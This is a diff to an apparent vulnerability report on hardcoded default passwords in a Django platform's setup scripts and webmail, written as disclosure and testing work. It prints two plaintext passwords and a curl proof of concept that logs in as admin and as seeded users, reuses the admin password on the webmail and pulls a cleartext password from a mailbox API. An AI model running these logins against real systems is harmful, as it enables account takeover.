@@ -25,13 +25,13 @@ No authentication-bypass logic is needed. The vulnerability is that a valid priv
 | 1 | Obtain the source or container image (repository checkout, or `docker run`/`docker exec` on the image) and open `setup/setup_database.py` and `setup/setup_webmail.py`. | Admin password `X#9kLm$P2v@nQ8w!ZjRe` and shared user password `Tr@c3d!7BxN#m9Kw2YpL` are read in plaintext (`setup_database.py:41`, `setup_webmail.py:25`). |
 | 2 | Alternatively, read the setup console output (`setup_database.py:514-545`) from logs. | Same credentials, plus the admin API key, appear in the summary. |
 | 3 | Log in to the Django admin at `http://localhost:8000/admin/` as `admin` with `X#9kLm$P2v@nQ8w!ZjRe`. | Full Django admin access (all models, all users). |
-| 4 | Log in to `http://localhost:8000/account/login/` as `admin` with the same password. | Authenticated session with admin privileges on the main platform. |
-| 5 | Log in as any seeded user (e.g. `johndoe`) with `Tr@c3d!7BxN#m9Kw2YpL`. | Access to 14 accounts from one leaked password. |
-| 6 | Reuse the admin password on the webmail (`http://localhost:8088`). | Access to the admin mailbox. |
+| 4 | Log in to `http://localhost:8000/account/login/` as `admin` with the same password. | `302` to `/account/process/` (then `/account/ask-2fa`, because the seeded `admin` has no 2FA enrolled): authenticated session with admin privileges on the main platform. |
+| 5 | Log in as any seeded user (e.g. `johndoe`) with `Tr@c3d!7BxN#m9Kw2YpL`. | Access to 14 accounts from one leaked password (all 14 users in `users.csv` verified: `302` to `/account/process/`). |
+| 6 | Reuse the admin password on the webmail (`POST http://localhost:8088/connect`, fields `Ufield` / `Pfield`; the webmail login is the full address `admin@tbox.traced`). Seeded users log in the same way (e.g. `john.doe@tbox.traced` / `Tr@c3d!7BxN#m9Kw2YpL`). | `302` to `/client` with `Id` / `Username` cookies: access to the admin mailbox and to every seeded mailbox. |
 
 # PoC
 
-Harvest the credentials from source, then log in (the main login is documented in the dev catalog as `POST /account/login/`; field names `username` / `password` are assumed):
+Harvest the credentials from source, then log in (main login: `POST /account/login/` with fields `username` / `password`, which also accepts the e-mail address):
 
 ```bash
 # 1. Harvest credentials from the deployed source (no network access needed)
@@ -49,11 +49,11 @@ curl -s -b admin.cookies -c admin.cookies -X POST \
   --data-urlencode 'password=X#9kLm$P2v@nQ8w!ZjRe' \
   -H "Referer: http://localhost:8000/account/login/" \
   http://localhost:8000/account/login/
-# Expected: HTTP 302 to the dashboard
+# Observed: HTTP 302, Location: /account/process/ (which forwards to /account/ask-2fa)
 
 # 4. Confirm admin panel access with the same session
 curl -s -b admin.cookies -o /dev/null -w "%{http_code}\n" http://localhost:8000/admin/
-# Expected: 200 (admin site), not 302 to the admin login
+# Observed: 200 ("Site administration" page), not 302 to the admin login
 
 # 5. Log in as a seeded user with the shared default password
 curl -s -c user.cookies http://localhost:8000/account/login/ -o /dev/null
@@ -64,7 +64,19 @@ curl -s -b user.cookies -c user.cookies -X POST \
   --data-urlencode 'password=Tr@c3d!7BxN#m9Kw2YpL' \
   -H "Referer: http://localhost:8000/account/login/" \
   http://localhost:8000/account/login/
-# Expected: HTTP 302 (authenticated session)
+# Observed: HTTP 302, Location: /account/process/ (authenticated session)
+
+# 6. Reuse the admin password on the webmail (username is the full address)
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -X POST \
+  --data-urlencode "Ufield=admin@tbox.traced" \
+  --data-urlencode 'Pfield=X#9kLm$P2v@nQ8w!ZjRe' \
+  http://localhost:8088/connect
+# Observed: 302 http://localhost:8088/client  (Id / Username cookies set)
+# Note: Ufield=admin returns "Unknown user."
+
+# 7. The cleartext password is also stored in each seeded mailbox (welcome e-mail)
+curl -s "http://localhost:8088/api/emails?user=john.doe" | grep -o 'Password: [^\\]*'
+# Observed: Password: Tr@c3d!7BxN#m9Kw2YpL
 ```
 
 # Risk
